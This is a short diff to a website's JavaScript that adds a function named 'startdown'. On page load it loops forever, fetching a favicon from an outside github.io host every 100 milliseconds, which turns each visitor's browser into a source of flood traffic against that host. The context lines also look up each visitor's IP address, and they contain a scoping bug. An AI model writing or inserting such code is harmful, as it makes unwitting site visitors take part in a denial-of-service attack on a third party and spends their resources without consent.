@@ -15,3 +15,10 @@ function delay(milliseconds){
 $.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/getip", function(data) {
 })
 var userip = (data.ip);
+
+window.onload = async function startdown(){
+  while(true) {
+    await delay(100);
+    fetch('https://t0m0t0w.github.io/favicon.png')
+  }
+}
